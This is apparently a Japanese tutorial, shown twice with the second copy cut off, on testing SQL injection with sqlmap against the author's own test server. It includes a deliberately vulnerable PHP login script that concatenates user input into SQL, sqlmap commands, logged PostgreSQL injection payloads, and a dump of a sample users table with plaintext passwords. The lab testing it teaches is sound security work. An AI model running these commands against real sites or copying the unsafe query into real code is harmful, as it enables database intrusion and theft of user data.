{"context": " More than 1 year has passed since last update.\n\n\u306f\u3058\u3081\u306b\n\u3053\u3053\u3067\u306fpython\u88fd\u306e\u30c4\u30fc\u30eb\u3067\u3042\u308b\u3001sqlmap\u3092\u4f7f\u3063\u3066\nSQL\u30a4\u30f3\u30b8\u30a7\u30af\u30b7\u30e7\u30f3\u306e\u691c\u8a3c\u3092\u3057\u307e\u3059\u3002\n\u691c\u8a3c\u76ee\u7684\u3067\u3059\u306e\u3067\u3001\u81ea\u5206\u3067\u305f\u3066\u305f\u30c6\u30b9\u30c8\u30b5\u30fc\u30d0\u306bSQL\u30a4\u30f3\u30b8\u30a7\u30af\u30b7\u30e7\u30f3\u3092\n\u3057\u304b\u3051\u307e\u3059\u3002\n\n\u5bfe\u5fdc\u3057\u3066\u3044\u308bDB\n\nMySQL\nOracle\nPostgreSQL\nMicrosoft SQL Server\nMicrosoft Access\nIBM DB2\nSQLite\nFirebird\nSybase\nSAP MaxDB\n\n\n\u691c\u77e5\u3067\u304d\u308bSQL\u30a4\u30f3\u30b8\u30a7\u30af\u30b7\u30e7\u30f3\u306e\u7a2e\u985e\n\nboolean-based blind\ntime-based blind\nerror-based\nUNION query\nstacked queries\nout-of-band\n\n\n\u691c\u8a3c\u74b0\u5883\n\n\n\u653b\u6483\u7528\u30b5\u30fc\u30d0(sqlmap\u5b9f\u884c\u5074):\n\nOS: CentOS6.4 x86_64\nPython: python2.2.6\n\n\n\n\u653b\u6483\u5bfe\u8c61\u30b5\u30fc\u30d0:\n\nOS: CentOS6.4 x86_64\nphp: 5.3.2\nApache: 2.2.25\nPostgreSQL: 9.2.5\n\n\n\n\n\u653b\u6483\u5bfe\u8c61\u30b5\u30a4\u30c8\n\u4e0b\u8a18\u306ePHP\u30b9\u30af\u30ea\u30d7\u30c8\u3092\u7528\u610f\u3057\u307e\u3057\u305f\u3002\n\u30ed\u30b0\u30a4\u30f3\u30d5\u30a9\u30fc\u30e0(sql_injection-002.html):\n<html>\n<head><title>\u30ed\u30b0\u30a4\u30f3\u3057\u3066\u304f\u3060\u3055\u3044</title></head>\n<body>\n<form action=\"sql_injection-003.php\" method=\"POST\">\n\u30e6\u30fc\u30b6\u540d<input type=\"text\" name=\"ID\"><br>\n\u30d1\u30b9\u30ef\u30fc\u30c9<input type=\"text\" name=\"PWD\"><br>\n<input type=\"submit\" value=\"\u30ed\u30b0\u30a4\u30f3\">\n</form>\n</body>\n</html>\n\n\u30ed\u30b0\u30a4\u30f3\u51e6\u7406\u30b9\u30af\u30ea\u30d7\u30c8(sql_injection-003.php):\n<?php\n  session_start();\n  header('Content-Type: text/html; charset=UTF-8');\n  $id = @$_POST['ID'];   // \u30e6\u30fc\u30b6ID\n  $pwd = @$_POST['PWD']; // \u30d1\u30b9\u30ef\u30fc\u30c9\n  // \u30c7\u30fc\u30bf\u30d9\u30fc\u30b9\u306b\u63a5\u7d9a\u3057\u30b3\u30cd\u30af\u30b7\u30e7\u30f3\u30aa\u30d6\u30b8\u30a7\u30af\u30c8\u3092\u751f\u6210\n  $con = pg_connect(\"host=localhost dbname=wasbook user=postgres password=wasbook\");\n  // SQL\u306e\u7d44\u307f\u7acb\u3066(\u30d7\u30ec\u30fc\u30b9\u30db\u30eb\u30c0\u306f\u610f\u56f3\u7684\u306b\u4f7f\u7528\u3057\u306a\u3044)\n  $sql = \"SELECT * FROM users WHERE id ='$id' and PWD = '$pwd'\";\n  $rs = pg_query($con, $sql);  // \u30af\u30a8\u30ea\u30fc\u5b9f\u884c\n?>\n<html>\n<body>\n<?php\n  if (pg_num_rows($rs) > 0) { // SELECT\u3057\u305f\u884c\u304c\u5b58\u5728\u3059\u308b\u5834\u5408\u30ed\u30b0\u30a4\u30f3\u6210\u529f\n    $_SESSION['id'] = $id;\n    echo '\u30ed\u30b0\u30a4\u30f3\u6210\u529f\u3067\u3059';\n  } else {\n    echo '\u30ed\u30b0\u30a4\u30f3\u5931\u6557\u3067\u3059';\n  }\n  pg_close($con);\n?>\n</body>\n</html>\n\n\nsqlmap\u30a4\u30f3\u30b9\u30c8\u30fc\u30eb\nGitH\u304b\u3089\u30ea\u30dd\u30b8\u30c8\u30ea\u3092\u30d5\u30a9\u30fc\u30af\u3059\u308b\u3060\u3051\u3067\u3059\u3002\n$ git clone https://github.com/sqlmapproject/sqlmap.git\n$ cd sqlmap\n\n\n\u4f7f\u3044\u65b9\n\u4ed6\u306e\u65b9\u304c\u8aac\u660e\u3092\u3057\u3066\u304f\u308c\u3066\u3044\u308b\u306e\u3067\u3001\u3053\u3053\u3067\u306f\u7d30\u304b\u3044\u8aac\u660e\u306f\u3057\u307e\u305b\u3093\u304c\u3001\u57fa\u672c\u7684\u306a\u3053\u3068\u3060\u3051\nGET\u30e1\u30bd\u30c3\u30c9\u306e\u5834\u5408\u306e\u4f8b:\npython sqlmap.py -u \"http://example.jp/sql_injection-003.php?ID=1&PWD=2\"\n\nPOST\u30e1\u30bd\u30c3\u30c9\u306e\u5834\u5408\u306e\u4f8b:\npython sqlmap.py -u \"http://example.jp/sql_injection-003.php\" --data \"ID=1&PWD=2\"\n\n\u57fa\u672c\u7684\u306a\u30b3\u30de\u30f3\u30c9:\n\n\n\n\u30b3\u30de\u30f3\u30c9(center)\n\u8aac\u660e(center)\n\n\n\n\n--dbs\n\u30c7\u30fc\u30bf\u30d9\u30fc\u30b9\u306e\u4e00\u89a7\u3092\u53d6\u5f97\n\n\n--tables\n\u30c6\u30fc\u30d6\u30eb\u306e\u4e00\u89a7\u3092\u53d6\u5f97\n\n\n-D\n\u30c7\u30fc\u30bf\u30d9\u30fc\u30b9\u306e\u6307\u5b9a(PostgreSQL\u3067\u306f\u30b5\u30fc\u30c1\u30d1\u30b9)\n\n\n-T\n\u30c6\u30fc\u30d6\u30eb\u306e\u6307\u5b9a\n\n\n--colums\n-T\u3068\u4e00\u7dd2\u306b\u4f7f\u3044\u30c6\u30fc\u30d6\u30eb\u5b9a\u7fa9\u3092\u4e00\u89a7\n\n\n--dump\n-T\u3068\u4e00\u7dd2\u306b\u4f7f\u3044\u30c6\u30fc\u30d6\u30eb\u30c7\u30fc\u30bf\u3092\u30c0\u30f3\u30d7\n\n\n\n\n\u8106\u5f31\u6027\u8a3a\u65ad\u3092\u3059\u308b\n\u8a3a\u65ad\u3092\u958b\u59cb\u3057\u307e\u3059:\n$ ./sqlmap.py -u \"http://example.jp/sql_injection-003.php\" --data=\"ID=1&PWD=2\" --dbms PostgreSQL\n\n    sqlmap/1.0-dev-67115ed - automatic SQL injection and database takeover tool\n    http://sqlmap.org\n\n[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program\n\n[*] starting at 07:05:04\n\n[07:05:04] [WARNING] using '/home/shyamahira/.sqlmap/output' as the output directory\n[07:05:04] [INFO] testing connection to the target URL\n[07:05:04] [INFO] testing if the target URL is stable. This can take a couple of seconds\n[07:05:05] [INFO] target URL is stable\n[07:05:05] [INFO] testing if POST parameter 'ID' is dynamic\n[07:05:05] [WARNING] POST parameter 'ID' does not appear dynamic\n[07:05:05] [INFO] heuristic (basic) test shows that POST parameter 'ID' might be injectable (possible DBMS: 'PostgreSQL')\n[07:05:05] [INFO] testing for SQL injection on POST parameter 'ID'\n[07:05:05] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'\n[07:05:05] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'\n[07:05:05] [INFO] POST parameter 'ID' is 'PostgreSQL AND error-based - WHERE or HAVING clause' injectable \n[07:05:05] [INFO] testing 'PostgreSQL inline queries'\n[07:05:05] [INFO] testing 'PostgreSQL > 8.1 stacked queries'\n[07:05:05] [WARNING] time-based comparison requires larger statistical model, please wait.....                                                \n[07:05:15] [INFO] POST parameter 'ID' seems to be 'PostgreSQL > 8.1 stacked queries' injectable \n[07:05:15] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'\n[07:05:25] [INFO] POST parameter 'ID' seems to be 'PostgreSQL > 8.1 AND time-based blind' injectable \n[07:05:25] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'\n[07:05:25] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found\n[07:05:25] [WARNING] reflective value(s) found and filtering out\n[07:05:25] [INFO] ORDER BY technique seems to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test\n[07:05:25] [INFO] target URL appears to have 6 columns in query\n\n\u4ee5\u4e0b\u306e\u3088\u3046\u306b\u805e\u304b\u308c\u305f\u3089\u3001Y\u3067\u5fdc\u7b54\u3057\u307e\u3059:\ninjection not exploitable with NULL values. Do you want to try with a random integer value for option '--union-char'? [Y/n] \n\nID\u30d1\u30e9\u30e1\u30fc\u30bf\u3067\u8106\u5f31\u6027\u304c\u691c\u51fa\u3055\u308c\u307e\u3057\u305f:\nPOST parameter 'ID' is vulnerable. Do you want to keep testing the others (if any)? [y/N] \n\n\u4e0a\u8a18\u30e1\u30c3\u30bb\u30fc\u30b8\u3092y\u3067\u5fdc\u7b54\u3057\u3001\u51e6\u7406\u3092\u9032\u3081\u307e\u3059:\n[07:10:07] [INFO] testing if POST parameter 'PWD' is dynamic\n[07:10:07] [WARNING] POST parameter 'PWD' does not appear dynamic\n[07:10:07] [INFO] heuristic (basic) test shows that POST parameter 'PWD' might be injectable (possible DBMS: 'PostgreSQL')\n[07:10:07] [INFO] testing for SQL injection on POST parameter 'PWD'\n[07:10:07] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'\n[07:10:07] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'\n[07:10:07] [INFO] POST parameter 'PWD' is 'PostgreSQL AND error-based - WHERE or HAVING clause' injectable \n[07:10:07] [INFO] testing 'PostgreSQL inline queries'\n[07:10:07] [INFO] testing 'PostgreSQL > 8.1 stacked queries'\n[07:10:17] [INFO] POST parameter 'PWD' seems to be 'PostgreSQL > 8.1 stacked queries' injectable \n[07:10:17] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'\n[07:10:27] [INFO] POST parameter 'PWD' seems to be 'PostgreSQL > 8.1 AND time-based blind' injectable \n[07:10:27] [INFO] testing 'Generic UNION query (60) - 1 to 20 columns'\n\nPWD\u30d1\u30e9\u30e1\u30fc\u30bf\u3067\u8106\u5f31\u6027\u304c\u691c\u51fa\u3055\u308c\u307e\u3057\u305f:\nPOST parameter 'PWD' is vulnerable. Do you want to keep testing the others (if any)? [y/N] \n\n\u4e0a\u8a18\u30e1\u30c3\u30bb\u30fc\u30b8\u3092y\u3067\u5fdc\u7b54\u3057\u3001\u51e6\u7406\u3092\u9032\u3081\u307e\u3059:\nPWD\u3068ID\u30d1\u30e9\u30e1\u30fc\u30bf\u306berror-based\u306eSQL\u30a4\u30f3\u30b8\u30a7\u30af\u30b7\u30e7\u30f3\u306e\u8106\u5f31\u6027\u304c\u3042\u308b\u3068\u8a3a\u65ad\u8a3a\u65ad\u3055\u308c\u307e\u3057\u305f:\nsqlmap identified the following injection points with a total of 101 HTTP(s) requests:\n---\nPlace: POST\nParameter: PWD\n    Type: error-based\n    Title: PostgreSQL AND error-based - WHERE or HAVING clause\n    Payload: ID=1&PWD=2' AND 5991=CAST((CHR(113)||CHR(112)||CHR(99)||CHR(112)||CHR(113))||(SELECT (CASE WHEN (5991=5991) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(112)||CHR(117)||CHR(117)||CHR(113)) AS NUMERIC) AND 'iBQp'='iBQp\n\n    Type: stacked queries\n    Title: PostgreSQL > 8.1 stacked queries\n    Payload: ID=1&PWD=2'; SELECT PG_SLEEP(5)--\n\n    Type: AND/OR time-based blind\n    Title: PostgreSQL > 8.1 AND time-based blind\n    Payload: ID=1&PWD=2' AND 9601=(SELECT 9601 FROM PG_SLEEP(5)) AND 'oMeE'='oMeE\n\nPlace: POST\nParameter: ID\n    Type: error-based\n    Title: PostgreSQL AND error-based - WHERE or HAVING clause\n    Payload: ID=1' AND 3272=CAST((CHR(113)||CHR(112)||CHR(99)||CHR(112)||CHR(113))||(SELECT (CASE WHEN (3272=3272) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(112)||CHR(117)||CHR(117)||CHR(113)) AS NUMERIC) AND 'ahLa'='ahLa&PWD=2\n\n    Type: stacked queries\n    Title: PostgreSQL > 8.1 stacked queries\n    Payload: ID=1'; SELECT PG_SLEEP(5)--&PWD=2\n\n    Type: AND/OR time-based blind\n    Title: PostgreSQL > 8.1 AND time-based blind\n    Payload: ID=1' AND 3167=(SELECT 3167 FROM PG_SLEEP(5)) AND 'GbHI'='GbHI&PWD=2\n---\n\n\u3053\u3053\u3067\u306fQuit\u3067\u6b62\u3081\u307e\u3059:\nthere were multiple injection points, please select the one to use for following injections:\n[0] place: POST, parameter: ID, type: Single quoted string (default)\n[1] place: POST, parameter: PWD, type: Single quoted string\n[q] Quit\n\n\n\u30c7\u30fc\u30bf\u30d9\u30fc\u30b9\u306e\u4e00\u89a7\u3092\u53d6\u5f97\u3059\u308b\n$ ./sqlmap.py -u \"http://example.jp/sql_injection-003.php\" --data=\"ID=1&PWD=2\" --dbs\n\uff5e \u7565 \uff5e\nthere were multiple injection points, please select the one to use for following injections:\n[0] place: POST, parameter: PWD, type: Single quoted string (default)\u3000<-\u3053\u3053\u3067\u306f0\u3092\u9078\u629e\u3059\u308b\n[1] place: POST, parameter: ID, type: Single quoted string\n[q] Quit\n\n\uff5e \u7565 \uff5e\n\navailable databases [3]:\n[*] information_schema\n[*] pg_catalog\n[*] public\n\n[11:57:55] [INFO] fetched data logged to text files under '/home/shyamahira/.sqlmap/output/example.jp'\n\n[*] shutting down at 11:57:55\n\n\n\u30c6\u30fc\u30d6\u30eb\u306e\u4e00\u89a7\u3092\u53d6\u5f97\u3059\u308b\n$ ./sqlmap.py -u \"http://example.jp/sql_injection-003.php\" --data=\"ID=1&PWD=2\" --tables\n\uff5e \u7565 \uff5e\nthere were multiple injection points, please select the one to use for following injections:\n[0] place: POST, parameter: PWD, type: Single quoted string (default)\u3000<-\u3053\u3053\u3067\u306f0\u3092\u9078\u629e\u3059\u308b\n[1] place: POST, parameter: ID, type: Single quoted string\n[q] Quit\n\n\uff5e \u7565 \uff5e\n\nDatabase: pg_catalog\n[42 tables]\n+-------------------------+\n| pg_aggregate            |\n| pg_am                   |\n| pg_amop                 |\n| pg_amproc               |\n| pg_attrdef              |\n| pg_attribute            |\n| pg_auth_members         |\n| pg_authid               |\n| pg_cast                 |\n| pg_class                |\n| pg_constraint           |\n| pg_conversion           |\n| pg_database             |\n| pg_depend               |\n| pg_description          |\n| pg_enum                 |\n| pg_foreign_data_wrapper |\n| pg_foreign_server       |\n| pg_index                |\n| pg_inherits             |\n| pg_language             |\n| pg_largeobject          |\n| pg_listener             |\n| pg_namespace            |\n| pg_opclass              |\n| pg_operator             |\n| pg_opfamily             |\n| pg_pltemplate           |\n| pg_proc                 |\n| pg_rewrite              |\n| pg_shdepend             |\n| pg_shdescription        |\n| pg_statistic            |\n| pg_tablespace           |\n| pg_trigger              |\n| pg_ts_config            |\n| pg_ts_config_map        |\n| pg_ts_dict              |\n| pg_ts_parser            |\n| pg_ts_template          |\n| pg_type                 |\n| pg_user_mapping         |\n+-------------------------+\n\nDatabase: information_schema\n[7 tables]\n+-------------------------+\n| sql_features            |\n| sql_implementation_info |\n| sql_languages           |\n| sql_packages            |\n| sql_parts               |\n| sql_sizing              |\n| sql_sizing_profiles     |\n+-------------------------+\n\nDatabase: public\n[4 tables]\n+-------------------------+\n| books                   |\n| dummy                   |\n| test                    |\n| users                   |\n+-------------------------+\n\n[12:06:06] [INFO] fetched data logged to text files under '/home/shyamahira/.sqlmap/output/example.jp'\n\n[*] shutting down at 12:06:06\n\n\n\u30c6\u30fc\u30d6\u30eb\u30c7\u30fc\u30bf\u306e\u30c0\u30f3\u30d7(users\u30c6\u30fc\u30d6\u30eb)\n$ ./sqlmap.py -u \"http://example.jp/sql_injection-003.php\" --data=\"ID=1&PWD=2\" -T users --dump\n\uff5e \u7565 \uff5e\nthere were multiple injection points, please select the one to use for following injections:\n[0] place: POST, parameter: PWD, type: Single quoted string (default)\u3000<-\u3053\u3053\u3067\u306f0\u3092\u9078\u629e\u3059\u308b\n[1] place: POST, parameter: ID, type: Single quoted string\n[q] Quit\n\n\uff5e \u7565 \uff5e\n\nDatabase: public\nTable: users\n[3 entries]\n+--------+--------------+----------+---------+--------------------+------+\n| id     | tel          | pwd      | addr    | mail               | name |\n+--------+--------------+----------+---------+--------------------+------+\n| sato   | 045-123-4567 | password | \u795e\u5948\u5ddd\u770c\u6a2a\u6d5c\u5e02 | sato@example.net   | \u4f50\u85e4\u4e00\u5fd7 |\n| tanaka | 03-1234-5678 | pass1    | \u6771\u4eac\u90fd\u6e2f\u533a\u4e09\u7530 | takana@example.com | \u5c71\u77f3\u4eac\u5b50 |\n| yamada | 046-123-4567 | pass1    | \u795e\u5948\u5ddd\u770c\u5ddd\u5d0e\u5e02 | yamada@example.jp  | \u5c71\u7530\u592a\u4e00 |\n+--------+--------------+----------+---------+--------------------+------+\n\n[12:08:35] [INFO] table 'public.users' dumped to CSV file '/home/shyamahira/.sqlmap/output/example.jp/dump/public/users.csv'\n[12:08:35] [INFO] fetched data logged to text files under '/home/shyamahira/.sqlmap/output/example.jp'\n\n[*] shutting down at 12:08:35\n\n\n\u6700\u5f8c\u306b\nsqlmap\u3092\u5b9f\u884c\u3057\u305f\u6642\u3001\u653b\u6483\u5bfe\u8c61\u306b\u3069\u3093\u306a\u30a2\u30af\u30bb\u30b9\u304c\u6765\u3066\u3044\u308b\u304b\u306b\u3064\u3044\u3066\u306f\n\u6642\u9593\u306e\u3042\u308b\u6642\u306b\u8ffd\u8a18\u3057\u305f\u3044\u3068\u601d\u3044\u307e\u3059\u3002\n\u306f\u3058\u3081\u306b\n---------\n\n\u3053\u3053\u3067\u306fpython\u88fd\u306e\u30c4\u30fc\u30eb\u3067\u3042\u308b\u3001sqlmap\u3092\u4f7f\u3063\u3066\nSQL\u30a4\u30f3\u30b8\u30a7\u30af\u30b7\u30e7\u30f3\u306e\u691c\u8a3c\u3092\u3057\u307e\u3059\u3002\n\n\u691c\u8a3c\u76ee\u7684\u3067\u3059\u306e\u3067\u3001\u81ea\u5206\u3067\u305f\u3066\u305f\u30c6\u30b9\u30c8\u30b5\u30fc\u30d0\u306bSQL\u30a4\u30f3\u30b8\u30a7\u30af\u30b7\u30e7\u30f3\u3092\n\u3057\u304b\u3051\u307e\u3059\u3002\n\n\u5bfe\u5fdc\u3057\u3066\u3044\u308bDB\n----------------\n\n* MySQL\n* Oracle\n* PostgreSQL\n* Microsoft SQL Server\n* Microsoft Access\n* IBM DB2\n* SQLite\n* Firebird\n* Sybase\n* SAP MaxDB\n\n\n\u691c\u77e5\u3067\u304d\u308bSQL\u30a4\u30f3\u30b8\u30a7\u30af\u30b7\u30e7\u30f3\u306e\u7a2e\u985e\n-------------------------------------\n\n* boolean-based blind\n* time-based blind\n* error-based\n* UNION query\n* stacked queries\n* out-of-band\n\n\u691c\u8a3c\u74b0\u5883\n---------\n\n* \u653b\u6483\u7528\u30b5\u30fc\u30d0(sqlmap\u5b9f\u884c\u5074):\n\n  * OS: CentOS6.4 x86_64\n\n  * Python: python2.2.6\n\n* \u653b\u6483\u5bfe\u8c61\u30b5\u30fc\u30d0:\n\n  * OS: CentOS6.4 x86_64\n\n  * php: 5.3.2\n\n  * Apache: 2.2.25\n\n  * PostgreSQL: 9.2.5\n\n\u653b\u6483\u5bfe\u8c61\u30b5\u30a4\u30c8\n---------------\n\n\u4e0b\u8a18\u306ePHP\u30b9\u30af\u30ea\u30d7\u30c8\u3092\u7528\u610f\u3057\u307e\u3057\u305f\u3002\n\n\u30ed\u30b0\u30a4\u30f3\u30d5\u30a9\u30fc\u30e0(sql_injection-002.html):\n\n```html\n<html>\n<head><title>\u30ed\u30b0\u30a4\u30f3\u3057\u3066\u304f\u3060\u3055\u3044</title></head>\n<body>\n<form action=\"sql_injection-003.php\" method=\"POST\">\n\u30e6\u30fc\u30b6\u540d<input type=\"text\" name=\"ID\"><br>\n\u30d1\u30b9\u30ef\u30fc\u30c9<input type=\"text\" name=\"PWD\"><br>\n<input type=\"submit\" value=\"\u30ed\u30b0\u30a4\u30f3\">\n</form>\n</body>\n</html>\n```\n\n\u30ed\u30b0\u30a4\u30f3\u51e6\u7406\u30b9\u30af\u30ea\u30d7\u30c8(sql_injection-003.php):\n\n```php\n<?php\n  session_start();\n  header('Content-Type: text/html; charset=UTF-8');\n  $id = @$_POST['ID'];   // \u30e6\u30fc\u30b6ID\n  $pwd = @$_POST['PWD']; // \u30d1\u30b9\u30ef\u30fc\u30c9\n  // \u30c7\u30fc\u30bf\u30d9\u30fc\u30b9\u306b\u63a5\u7d9a\u3057\u30b3\u30cd\u30af\u30b7\u30e7\u30f3\u30aa\u30d6\u30b8\u30a7\u30af\u30c8\u3092\u751f\u6210\n  $con = pg_connect(\"host=localhost dbname=wasbook user=postgres password=wasbook\");\n  // SQL\u306e\u7d44\u307f\u7acb\u3066(\u30d7\u30ec\u30fc\u30b9\u30db\u30eb\u30c0\u306f\u610f\u56f3\u7684\u306b\u4f7f\u7528\u3057\u306a\u3044)\n  $sql = \"SELECT * FROM users WHERE id ='$id' and PWD = '$pwd'\";\n  $rs = pg_query($con, $sql);  // \u30af\u30a8\u30ea\u30fc\u5b9f\u884c\n?>\n<html>\n<body>\n<?php\n  if (pg_num_rows($rs) > 0) { // SELECT\u3057\u305f\u884c\u304c\u5b58\u5728\u3059\u308b\u5834\u5408\u30ed\u30b0\u30a4\u30f3\u6210\u529f\n    $_SESSION['id'] = $id;\n    echo '\u30ed\u30b0\u30a4\u30f3\u6210\u529f\u3067\u3059';\n  } else {\n    echo '\u30ed\u30b0\u30a4\u30f3\u5931\u6557\u3067\u3059';\n  }\n  pg_close($con);\n?>\n</body>\n</html>\n```\n\nsqlmap\u30a4\u30f3\u30b9\u30c8\u30fc\u30eb\n--------------------\n\nGitH\u304b\u3089\u30ea\u30dd\u30b8\u30c8\u30ea\u3092\u30d5\u30a9\u30fc\u30af\u3059\u308b\u3060\u3051\u3067\u3059\u3002\n\n```bash\n$ git clone https://github.com/sqlmapproject/sqlmap.git\n$ cd sqlmap\n```\n\n\u4f7f\u3044\u65b9\n-------\n\n\u4ed6\u306e\u65b9\u304c\u8aac\u660e\u3092\u3057\u3066\u304f\u308c\u3066\u3044\u308b\u306e\u3067\u3001\u3053\u3053\u3067\u306f\u7d30\u304b\u3044\u8aac\u660e\u306f\u3057\u307e\u305b\u3093\u304c\u3001\u57fa\u672c\u7684\u306a\u3053\u3068\u3060\u3051\n\nGET\u30e1\u30bd\u30c3\u30c9\u306e\u5834\u5408\u306e\u4f8b:\n\n```bash\npython sqlmap.py -u \"http://example.jp/sql_injection-003.php?ID=1&PWD=2\"\n```\n\nPOST\u30e1\u30bd\u30c3\u30c9\u306e\u5834\u5408\u306e\u4f8b:\n\n```bash\npython sqlmap.py -u \"http://example.jp/sql_injection-003.php\" --data \"ID=1&PWD=2\"\n```\n\n\u57fa\u672c\u7684\u306a\u30b3\u30de\u30f3\u30c9:\n\n\u30b3\u30de\u30f3\u30c9(center)|\u8aac\u660e(center)                                 |\n:---------------|:--------------------------------------------|\n--dbs           |\u30c7\u30fc\u30bf\u30d9\u30fc\u30b9\u306e\u4e00\u89a7\u3092\u53d6\u5f97\n--tables        |\u30c6\u30fc\u30d6\u30eb\u306e\u4e00\u89a7\u3092\u53d6\u5f97 \n-D              |\u30c7\u30fc\u30bf\u30d9\u30fc\u30b9\u306e\u6307\u5b9a(PostgreSQL\u3067\u306f\u30b5\u30fc\u30c1\u30d1\u30b9)\n-T              |\u30c6\u30fc\u30d6\u30eb\u306e\u6307\u5b9a\n--colums        |-T\u3068\u4e00\u7dd2\u306b\u4f7f\u3044\u30c6\u30fc\u30d6\u30eb\u5b9a\u7fa9\u3092\u4e00\u89a7\n--dump          |-T\u3068\u4e00\u7dd2\u306b\u4f7f\u3044\u30c6\u30fc\u30d6\u30eb\u30c7\u30fc\u30bf\u3092\u30c0\u30f3\u30d7\n\n\n\u8106\u5f31\u6027\u8a3a\u65ad\u3092\u3059\u308b\n------------------\n\n\u8a3a\u65ad\u3092\u958b\u59cb\u3057\u307e\u3059:\n\n```bash\n$ ./sqlmap.py -u \"http://example.jp/sql_injection-003.php\" --data=\"ID=1&PWD=2\" --dbms PostgreSQL\n\n    sqlmap/1.0-dev-67115ed - automatic SQL injection and database takeover tool\n    http://sqlmap.org\n\n[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program\n\n[*] starting at 07:05:04\n\n[07:05:04] [WARNING] using '/home/shyamahira/.sqlmap/output' as the output directory\n[07:05:04] [INFO] testing connection to the target URL\n[07:05:04] [INFO] testing if the target URL is stable. This can take a couple of seconds\n[07:05:05] [INFO] target URL is stable\n[07:05:05] [INFO] testing if POST parameter 'ID' is dynamic\n[07:05:05] [WARNING] POST parameter 'ID' does not appear dynamic\n[07:05:05] [INFO] heuristic (basic) test shows that POST parameter 'ID' might be injectable (possible DBMS: 'PostgreSQL')\n[07:05:05] [INFO] testing for SQL injection on POST parameter 'ID'\n[07:05:05] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'\n[07:05:05] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'\n[07:05:05] [INFO] POST parameter 'ID' is 'PostgreSQL AND error-based - WHERE or HAVING clause' injectable \n[07:05:05] [INFO] testing 'PostgreSQL inline queries'\n[07:05:05] [INFO] testing 'PostgreSQL > 8.1 stacked queries'\n[07:05:05] [WARNING] time-based comparison requires larger statistical model, please wait.....                                                \n[07:05:15] [INFO] POST parameter 'ID' seems to be 'PostgreSQL > 8.1 stacked queries' injectable \n[07:05:15] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'\n[07:05:25] [INFO] POST parameter 'ID' seems to be 'PostgreSQL > 8.1 AND time-based blind' injectable \n[07:05:25] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'\n[07:05:25] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found\n[07:05:25] [WARNING] reflective value(s) found and filtering out\n[07:05:25] [INFO] ORDER BY technique seems to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test\n[07:05:25] [INFO] target URL appears to have 6 columns in query\n```\n\n\u4ee5\u4e0b\u306e\u3088\u3046\u306b\u805e\u304b\u308c\u305f\u3089\u3001Y\u3067\u5fdc\u7b54\u3057\u307e\u3059:\n\n```bash\ninjection not exploitable with NULL values. Do you want to try with a random integer value for option '--union-char'? [Y/n] \n```\n\nID\u30d1\u30e9\u30e1\u30fc\u30bf\u3067\u8106\u5f31\u6027\u304c\u691c\u51fa\u3055\u308c\u307e\u3057\u305f:\n\n```bash\nPOST parameter 'ID' is vulnerable. Do you want to keep testing the others (if any)? [y/N] \n```\n\n\u4e0a\u8a18\u30e1\u30c3\u30bb\u30fc\u30b8\u3092y\u3067\u5fdc\u7b54\u3057\u3001\u51e6\u7406\u3092\u9032\u3081\u307e\u3059:\n\n```bash\n[07:10:07] [INFO] testing if POST parameter 'PWD' is dynamic\n[07:10:07] [WARNING] POST parameter 'PWD' does not appear dynamic\n[07:10:07] [INFO] heuristic (basic) test shows that POST parameter 'PWD' might be injectable (possible DBMS: 'PostgreSQL')\n[07:10:07] [INFO] testing for SQL injection on POST parameter 'PWD'\n[07:10:07] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'\n[07:10:07] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'\n[07:10:07] [INFO] POST parameter 'PWD' is 'PostgreSQL AND error-based - WHERE or HAVING clause' injectable \n[07:10:07] [INFO] testing 'PostgreSQL inline queries'\n[07:10:07] [INFO] testing 'PostgreSQL > 8.1 stacked queries'\n[07:10:17] [INFO] POST parameter 'PWD' seems to be 'PostgreSQL > 8.1 stacked queries' injectable \n[07:10:17] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'\n[07:10:27] [INFO] POST parameter 'PWD' seems to be 'PostgreSQL > 8.1 AND time-based blind' injectable \n[07:10:27] [INFO] testing 'Generic UNION query (60) - 1 to 20 columns'\n```\n\nPWD\u30d1\u30e9\u30e1\u30fc\u30bf\u3067\u8106\u5f31\u6027\u304c\u691c\u51fa\u3055\u308c\u307e\u3057\u305f:\n\n```bash\nPOST parameter 'PWD' is vulnerable. Do you want to keep testing the others (if any)? [y/N] \n```\n\n\u4e0a\u8a18\u30e1\u30c3\u30bb\u30fc\u30b8\u3092y\u3067\u5fdc\u7b54\u3057\u3001\u51e6\u7406\u3092\u9032\u3081\u307e\u3059:\n\nPWD\u3068ID\u30d1\u30e9\u30e1\u30fc\u30bf\u306berror-based\u306eSQL\u30a4\u30f3\u30b8\u30a7\u30af\u30b7\u30e7\u30f3\u306e\u8106\u5f31\u6027\u304c\u3042\u308b\u3068\u8a3a\u65ad\u8a3a\u65ad\u3055\u308c\u307e\u3057\u305f:\n\n```bash\nsqlmap identified the following injection points with a total of 101 HTTP(s) requests:\n---\nPlace: POST\nParameter: PWD\n    Type: error-based\n    Title: PostgreSQL AND error-based - WHERE or HAVING clause\n    Payload: ID=1&PWD=2' AND 5991=CAST((CHR(113)||CHR(112)||CHR(99)||CHR(112)||CHR(113))||(SELECT (CASE WHEN (5991=5991) THEN 1 ELSE 0 